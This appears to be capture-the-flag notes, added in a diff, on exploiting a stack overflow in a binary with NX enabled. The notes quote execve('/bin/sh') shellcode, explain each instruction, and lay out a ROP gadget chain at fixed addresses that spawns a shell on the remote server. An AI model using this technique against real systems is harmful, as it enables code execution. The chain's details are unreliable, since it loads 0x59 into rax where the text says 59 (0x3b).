@@ -1,0 +1,99 @@
+checksec inspector
+
+rsp (rbp-0x20)
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141
+41414141 ==> old rbp
+RET ADDR ==> gadget_n instr prior to the ret instr 
+
+think about parameter/arg
+
+
+we can use a shellcode and try to recreate that using rop
+https://www.exploit-db.com/exploits/42179
+shellcode assembly:
+push rax
+      xor rdx, rdx
+      xor rsi, rsi
+      mov rbx,'/bin//sh'
+      push rbx
+      push rsp
+      pop rdi
+      mov al, 59
+      syscall
+
+but NX is enabled on the binary so shellcode on the stack is not executable, but we can create our own set of instructions based on our understanding of how syscalls work
+59 is execve syscall and it takes rdi, rsi and rdx as args
+how do we know that? https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
+rdi is the important cause that the file that execve executes
+in our case we want that to be /bin/sh so that we can pop a shell
+
+the stack looks like this:
+
+--- <--- rsp
+---
+---
+---
+rbp
+ret
+
+the 2 xor instructions just clear rsi and rdx registers
+rbx contains our 'file to execute' or just 'file'
+push rbx moves it to the top of the stack
+
+rbx
+--- <---rsp
+---
+---
+---
+rbp
+ret
+
+push rsp then moves the rsp to the top cause rsp needs to point to the top of the stack frame
+
+rbx <--- rsp
+---
+---
+---
+---
+rbp
+ret
+
+
+pop rdi is the interesting one here! 
+pop rdi pops the value that at the top of the stack and stores it in rdi
+rbx is top of the stack and rbx = "/bin/sh\x00"
+so rdi is "/bin/sh\x00"
+
+note:
+\x00 null byte is added to make it 8 bytes, you could also do //bin/sh
+
+rax (or al) needs ot be equal to 59 or 0x3b as well before the syscall is made 
+so the program knows to make a sys_execve with the param as rdi ("/bin/sh\x00")
+
+we also need to make sure that rsi and rdx are 0x0 so they dont interfere with the syscall
+since the syscall takes 3 args if available in the registers
+
+lets analyse the gadgets for: 
+1 - useful instructions 
+2 - [addresses]
+3 - (value at the top of the stack at the time of execution)
+
+gadget_2 ==> pop rdi; ret [0x0040062e] (address of "/bin/sh\x00" <-- rsp)
+gadget_3 ==> pop rsi; ret [0x00400636] (0x0 <-- rsp)
+gadget_4 ==> pop rdx; ret [0x0040063e] (0x0 <-- rsp)
+gadget_5 ==> pop rax; ret [0x00400646] (0x59 <-- rsp)
+gadget_1 ==> system       [0x00400625] (boom! shell!)
+
+/bin/sh\x00 = 0x2f62696e2f736800
+
+about the address of "/bin/sh", we can give the input 'A'*0x20 + '/bin/sh\x00' and it will be stored on the stack 
+for eg, 0x7fffffffde50 is the address for the /bin/sh part of the input on the stack locally
+however, although this works locally, the stack addresses on the server will be different so this wont work there
+So I searched and found an unused "/bin/sh" string in the program (using Ghidra) and hard coded that address because the gadget address will remain the same on the server as well
